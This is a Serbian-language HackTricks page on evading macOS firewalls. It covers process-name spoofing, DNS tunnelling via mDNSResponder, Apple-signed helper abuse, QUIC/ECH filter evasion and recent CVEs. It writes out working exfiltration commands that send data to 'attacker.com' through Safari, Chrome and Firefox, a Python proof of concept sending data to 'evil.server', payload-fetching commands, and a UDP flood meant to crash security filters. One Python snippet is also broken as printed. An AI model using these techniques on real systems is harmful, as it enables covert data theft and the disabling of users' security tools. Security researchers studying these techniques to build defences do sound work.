# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Pronađene tehnike

Sledeće tehnike su se pokazale uspešnim u nekim macOS firewall aplikacijama.

### Zloupotreba whitelist imena

- Na primer, pokretanje malware-a sa imenima dobro poznatih macOS procesa, kao što je **`launchd`**

### Synthetic Click

- Ako firewall zatraži dozvolu od korisnika, naterajte malware da **klikne na allow**

### **Korišćenje Apple signed binarnih fajlova**

- Kao što je **`curl`**, ali i drugih, poput **`whois`**

### Dobro poznati Apple domeni

Firewall može dozvoljavati konekcije ka dobro poznatim Apple domenima, kao što su **`apple.com`** ili **`icloud.com`**. iCloud se može koristiti kao C2.

### Generic Bypass

Neke ideje za pokušaj zaobilaženja firewalla

### Provera dozvoljenog saobraćaja

Poznavanje dozvoljenog saobraćaja pomoći će vam da identifikujete potencijalno whitelistovane domene ili aplikacije kojima je dozvoljen pristup tim domenima
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Zloupotreba DNS-a

Na macOS-u proces **ne komunicira** direktno sa DNS serverom. Razrešavanje imena se posreduje preko **XPC-a** putem **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), sistemskog daemona koji je potpisao Apple, tako da svaki lookup na računaru napušta host kao saobraćaj **od `mDNSResponder`**, a ne od procesa koji ga je zatražio. Zbog toga firewall-i uglavnom bezuslovno veruju tom daem​​onu — njegovo blokiranje bi prekinulo razrešavanje imena za čitav sistem.<sup>[1]</sup>

To čini DNS kanalom koji ostaje otvoren čak i kada firewall blokira sopstvene socket-e malware-a:<sup>[1]</sup>

1. Malware pokušava da se poveže sa `evil.com`. Firewall proverava njegovu **sopstvenu outbound konekciju** i **blokira je**.
2. Malware umesto toga traži od **`mDNSResponder`** da **razreši** `evil.com`, putem XPC-a.
3. Firewall proverava rezultujući query, vidi resolver kome Apple veruje i koji je potpisao Apple kao izvornog pošiljaoca, pa ga **dozvoljava**.
4. Query stiže do DNS servera — a ako napadač upravlja authoritative serverom za `evil.com`, on kontroliše obe strane razmene.

Pošto napadač poseduje tu zonu, nikakva „konekcija“ uopšte nije potrebna: podaci se iznose unutar **queried labela** (npr. `<encoded-chunk>.evil.com`), a komande se vraćaju unutar **answer record-a** (TXT, A, CNAME…), što je klasičan DNS tunnelling koji koristi proces sa potpuno dozvoljenim saobraćajem.

Svaki unprivileged proces može direktno da upravlja daemonom, što je jednostavan način da se potvrdi da je ovaj put otvoren:
```bash
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Preko Browser aplikacija

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Putem process injection tehnike

Ako možete da **injectujete code u process** kome je dozvoljeno povezivanje sa bilo kojim serverom, možete zaobići firewall zaštitu:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Nedavne ranjivosti za zaobilaženje macOS firewall-a (2023–2025)

### Zaobilaženje Web content filter-a (Screen Time) – **CVE-2024-44206**
U julu 2024. Apple je zakrpio kritičnu grešku u Safari/WebKit-u koja je onemogućavala pravilan rad sistemskog „Web content filter-a“, koji koriste roditeljske kontrole Screen Time-a.
Posebno kreiran URI (na primer, sa dvostruko URL-enkodovanim „://“) Screen Time ACL ne prepoznaje, dok ga WebKit prihvata, zbog čega se zahtev šalje bez filtera. Zato svaki process koji može da otvori URL (uključujući sandboxed ili unsigned code) može da pristupi domenima koje je korisnik ili MDM profil izričito blokirao.<sup>[2]</sup>

Praktični test (na nezakrpljenom system-u):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Greška u redosledu pravila Packet Filter-a (PF) u ranim verzijama macOS 14 „Sonoma“
Tokom beta ciklusa macOS-a 14, Apple je uveo regresiju u userspace wrapper-u oko **`pfctl`**.
Pravila dodata pomoću ključne reči `quick` (koju koriste mnogi VPN kill-switch-evi) bila su tiho zanemarena, što je izazivalo saobraćajne leak-ove čak i kada je VPN/firewall GUI prikazivao *blocked*. Grešku je potvrdilo nekoliko VPN vendora, a ispravljena je u RC 2 (build 23A344).

Brza provera leak-a:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Zloupotreba pomoćnih servisa potpisanih od strane Apple-a (legacy – pre macOS 11.2)
Pre macOS 11.2, **`ContentFilterExclusionList`** je omogućavao da oko 50 Apple binarnih datoteka, kao što su **`nsurlsessiond`** i App Store, zaobiđu sve socket-filter firewall-e implementirane pomoću Network Extension framework-a (LuLu, Little Snitch itd.).
Malware je jednostavno mogao da pokrene izuzeti proces — ili da u njega inject-uje kod — i tuneluje sopstveni saobraćaj preko već dozvoljenog socket-a. Apple je potpuno uklonio listu izuzetaka u macOS 11.2, ali je ova tehnika i dalje relevantna na sistemima koji ne mogu da se nadograde.<sup>[3]</sup>

Primer proof-of-concept-a (pre 11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH za zaobilaženje Network Extension filtera domena (macOS 12+)
NEFilter Packet/Data Providers se oslanjaju na SNI/ALPN u TLS ClientHello poruci. Uz **HTTP/3 over QUIC (UDP/443)** i **Encrypted Client Hello (ECH)**, SNI ostaje šifrovan, NetExt ne može da analizira tok, a pravila za hostname često koriste fail-open ponašanje, omogućavajući malware-u da pristupi blokiranim domenima bez korišćenja DNS-a.<sup>[5]</sup>

Minimalni PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Ako je QUIC/ECH i dalje omogućen, ovo je jednostavan način za zaobilaženje hostname filtera.

### Nestabilnost Network Extension-a u macOS-u 15 „Sequoia” (2024–2025)
Rane verzije 15.0/15.1 ruše third-party **Network Extension** filtere (LuLu, Little Snitch, Defender, SentinelOne itd.). Kada se filter ponovo pokrene, macOS odbacuje pravila za protok i mnogi proizvodi prelaze u fail-open režim. Preplavljivanje filtera hiljadama kratkih UDP protoka (ili forsiranje QUIC/ECH-a) može uzastopno izazivati rušenje i ostaviti prostor za C2/exfil, dok GUI i dalje prikazuje da firewall radi.<sup>[4]</sup>

Brza reprodukcija (bezbedna lab mašina):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Saveti za alate za moderni macOS

1. Proverite trenutna PF pravila koja generišu GUI firewall-i:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Izlistajte binarne datoteke koje već poseduju *outgoing-network* entitlement (korisno za piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Programski registrujte sopstveni Network Extension content filter u Objective-C/Swift-u.  
Minimalni rootless PoC koji prosleđuje pakete lokalnom socket-u dostupan je u izvornom kodu Patricka Wardlea za **LuLu**.

## Reference

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Kreiranje i probijanje macOS firewall-a](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Zaobilaženje Apple web content filter-a omogućava neograničen pristup blokiranom sadržaju (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple uklanja macOS funkciju koja je aplikacijama omogućavala zaobilaženje firewall zaštite - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity proizvodi prestaju da funkcionišu nakon macOS Sequoia ažuriranja - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Koristite network protection da biste sprečili macOS konekcije ka zlonamernim sajtovima - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
